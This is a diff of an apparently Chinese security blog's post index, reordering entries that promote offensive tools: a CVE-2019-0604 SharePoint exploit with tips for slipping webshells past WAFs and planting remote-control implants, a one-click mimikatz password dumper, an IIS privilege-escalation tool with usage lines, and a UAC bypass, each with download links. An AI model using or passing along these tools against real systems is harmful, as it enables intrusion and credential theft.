-<p><span style="font-size: 16px;">比如菜刀,因为飞刀UA系列的WebShell除了过WAF，均无文件管理功能</span></p>
-<p><span style="font-size: 16px;">使用UA而不使用菜刀一句话，是因为菜刀一句话都是POST，容易被WAF拦截</span></p>
-<p><span style="font-size: 16px;">当然你传过去后发现目标无WAF或无杀软，再传其它Webshell或植入远控都可以</span></p>
-<p><img alt data-original="http://k8gege.org/k8img/posts/CVE-2019-0604_3.png"></p>
-<p>&nbsp;</p>
-<p><span style="font-size: 18px; color: #ff00ff;"><strong>下载：</strong></span></p>
-<p>&nbsp;<a href="https://github.com/k8gege/CVE-2019-0604" target="_blank">https://github.com/k8gege/CVE-2019-0604</a></p>
-<p><a href="https://github.com/k8gege/K8tools/raw/master/cve-2019-0604-exp.py" target="_blank">&nbsp;https://github.com/k8gege/K8tools/raw/master/cve-2019-0604-exp.py</a></p>
-]]></content>
-      <categories>
-        <category>工具</category>
-        <category>Exp</category>
-      </categories>
-      <tags>
-        <tag>Tool</tag>
-        <tag>Exp</tag>
-        <tag>GetShell</tag>
-        <tag>Code</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>mimikatz 2.1.1一键版 &amp; PowerShell</title>
-    <url>/p/77429fa6.html</url>
-    <content><![CDATA[<p>无需任何参数,运行EXE即可自动读取Windows系统密码</p>
-<p>EXE版需要其它功能请使用原版 (参数已写死仅读密码)</p>
-<p>结果保存于当前目录mz.log</p>
-<p>EXE</p>
-<p><a href="https://github.com/k8gege/K8tools/blob/master/mz.exe" target="_blank">https://github.com/k8gege/K8tools/blob/master/mz.exe</a></p>
-<p><a href="https://github.com/k8gege/K8tools/blob/master/mz64.exe" target="_blank">https://github.com/k8gege/K8tools/blob/master/mz64.exe</a></p>
-<p>PowerShell</p>
-<p><a href="https://github.com/k8gege/K8tools/blob/master/Invoke-Mimikatz.ps1" target="_blank">https://github.com/k8gege/K8tools/blob/master/Invoke-Mimikatz.ps1</a></p>]]></content>
-      <categories>
-        <category>工具</category>
-        <category>提权</category>
-        <category>密码</category>
-        <category>PowerShell</category>
-      </categories>
-      <tags>
-        <tag>Tool</tag>
-        <tag>PowerShell</tag>
-        <tag>mimikatz</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>全版本IIS提权工具iislpe</title>
-    <url>/p/6b9b3afe.html</url>
-    <content><![CDATA[<p><strong>工具: </strong>iislpe.exe<strong><br></strong></p>
-<p><strong>编译: </strong><a href="https://www.cnblogs.com/k8gege" target="_blank">.</a>net 3.5 </p>
-<p>　　全版本IIS提权工具<a href="https://www.cnblogs.com/k8gege" target="_blank">,</a>支持IIS应用池用户/网络服务用户/本地服务用户</p>
-<p><strong>原理:</strong></p>
-<p><em>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; </em>通过NTLM重放将权限提升至SYSTEM权限,详情参考Potato。</p>
-<p><strong>用法:</strong></p>
-<p>IIS Priviledge by k8gege<br>IIS APPPOOL / Network Service / Local Service<br>Us<a href="https://www.cnblogs.com/k8gege/" target="_blank">e</a>age:<br>iislpe c<a href="https://www.cnblogs.com/k8gege/p/10389522.html" target="_blank">:</a>\any.bat<br>iislpe c:\any.exe</p>
-<p><a href="https://www.cnblogs.com/k8gege/p/10389522.html" target="_blank"><img alt data-original="http://k8gege.org/k8img/posts/iislpe.png"></a></p>
-<p>&nbsp;</p>
-<p>&nbsp;下载:https://github.com/k8gege/K8tools/iislpe.rar</p>
-<p>&nbsp; &nbsp;&nbsp; </p>
-<p>&nbsp;</p>
-<p>&nbsp;&nbsp;&nbsp;&nbsp; </p>]]></content>
-      <categories>
-        <category>工具</category>
-        <category>提权</category>
-      </categories>
-      <tags>
-        <tag>Tool</tag>
-        <tag>LPE</tag>
-        <tag>Exp</tag>
-        <tag>IIS</tag>
       </tags>
   </entry>
   <entry>
@@ -4559,13 +4509,36 @@ payload5='\x23\x64\x61\x74\x65\x3A\x20\x32\x30\x31\x39\x30\x36\x32\x36\x20\x23\x
 <p><img alt data-original="http://k8gege.org/k8img/posts/k8uac.png"></p>
 <p>&nbsp;下载：<a href="https://files.cnblogs.com/files/k8gege/k8uac_20181125%5BK8%5D.rar" target="_blank">https://files.cnblogs.com/files/k8gege/k8uac_20181125%5BK8%5D.rar</a></p>]]></content>
       <categories>
-        <category>工具</category>
         <category>提权</category>
+        <category>工具</category>
+      </categories>
+      <tags>
+        <tag>Exp</tag>
+        <tag>Tool</tag>
+        <tag>BypassUAC</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>mimikatz 2.1.1一键版 &amp; PowerShell</title>
+    <url>/p/77429fa6.html</url>
+    <content><![CDATA[<p>无需任何参数,运行EXE即可自动读取Windows系统密码</p>
+<p>EXE版需要其它功能请使用原版 (参数已写死仅读密码)</p>
+<p>结果保存于当前目录mz.log</p>
+<p>EXE</p>
+<p><a href="https://github.com/k8gege/K8tools/blob/master/mz.exe" target="_blank">https://github.com/k8gege/K8tools/blob/master/mz.exe</a></p>
+<p><a href="https://github.com/k8gege/K8tools/blob/master/mz64.exe" target="_blank">https://github.com/k8gege/K8tools/blob/master/mz64.exe</a></p>
+<p>PowerShell</p>
+<p><a href="https://github.com/k8gege/K8tools/blob/master/Invoke-Mimikatz.ps1" target="_blank">https://github.com/k8gege/K8tools/blob/master/Invoke-Mimikatz.ps1</a></p>]]></content>
+      <categories>
+        <category>提权</category>
+        <category>工具</category>
+        <category>密码</category>
+        <category>PowerShell</category>
       </categories>
       <tags>
         <tag>Tool</tag>
-        <tag>Exp</tag>
-        <tag>BypassUAC</tag>
+        <tag>PowerShell</tag>
+        <tag>mimikatz</tag>
       </tags>
   </entry>
   <entry>
@@ -4607,14 +4580,41 @@ exploit(dip, dport, &quot;&quot;, &quot;&quot;, &quot;&quot;, &quot;&quot;)</cod
 <p>链接: <a href="https://github.com/k8gege/K8tools/raw/master/ColdFusion%208%20LFI%20EXP_20160414%5BK.8%5D.rar" target="_blank">https://github.com/k8gege/K8tools/raw/master/ColdFusion%208%20LFI%20EXP_20160414%5BK.8%5D.rar</a></p>
 <p>&nbsp;</p>]]></content>
       <categories>
-        <category>工具</category>
         <category>Exp</category>
+        <category>工具</category>
       </categories>
       <tags>
-        <tag>Tool</tag>
         <tag>Exp</tag>
+        <tag>Tool</tag>
         <tag>GetShell</tag>
         <tag>Weblogic</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>全版本IIS提权工具iislpe</title>
+    <url>/p/6b9b3afe.html</url>
+    <content><![CDATA[<p><strong>工具: </strong>iislpe.exe<strong><br></strong></p>
+<p><strong>编译: </strong><a href="https://www.cnblogs.com/k8gege" target="_blank">.</a>net 3.5 </p>
+<p>　　全版本IIS提权工具<a href="https://www.cnblogs.com/k8gege" target="_blank">,</a>支持IIS应用池用户/网络服务用户/本地服务用户</p>
+<p><strong>原理:</strong></p>
+<p><em>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; </em>通过NTLM重放将权限提升至SYSTEM权限,详情参考Potato。</p>
+<p><strong>用法:</strong></p>
+<p>IIS Priviledge by k8gege<br>IIS APPPOOL / Network Service / Local Service<br>Us<a href="https://www.cnblogs.com/k8gege/" target="_blank">e</a>age:<br>iislpe c<a href="https://www.cnblogs.com/k8gege/p/10389522.html" target="_blank">:</a>\any.bat<br>iislpe c:\any.exe</p>
+<p><a href="https://www.cnblogs.com/k8gege/p/10389522.html" target="_blank"><img alt data-original="http://k8gege.org/k8img/posts/iislpe.png"></a></p>
+<p>&nbsp;</p>
+<p>&nbsp;下载:https://github.com/k8gege/K8tools/iislpe.rar</p>
+<p>&nbsp; &nbsp;&nbsp; </p>
+<p>&nbsp;</p>
+<p>&nbsp;&nbsp;&nbsp;&nbsp; </p>]]></content>
+      <categories>
+        <category>提权</category>
+        <category>工具</category>
+      </categories>
+      <tags>
+        <tag>Exp</tag>
+        <tag>Tool</tag>
+        <tag>LPE</tag>
+        <tag>IIS</tag>
       </tags>
   </entry>
   <entry>
@@ -4680,13 +4680,13 @@ from pprint import pprint
 <p><a href="https://www.cnblogs.com/k8gege/p/10367844.html" target="_blank">https://www.cnblogs.com/k8gege/p/10367844.html</a></p>]]></content>
       <categories>
         <category>工具</category>
-        <category>主机发现</category>
         <category>源码</category>
+        <category>主机发现</category>
+        <category>嗅探</category>
         <category>内网渗透</category>
         <category>信息收集</category>
-        <category>编程</category>
         <category>Python</category>
-        <category>嗅探</category>
+        <category>编程</category>
       </categories>
       <tags>
         <tag>Tool</tag>
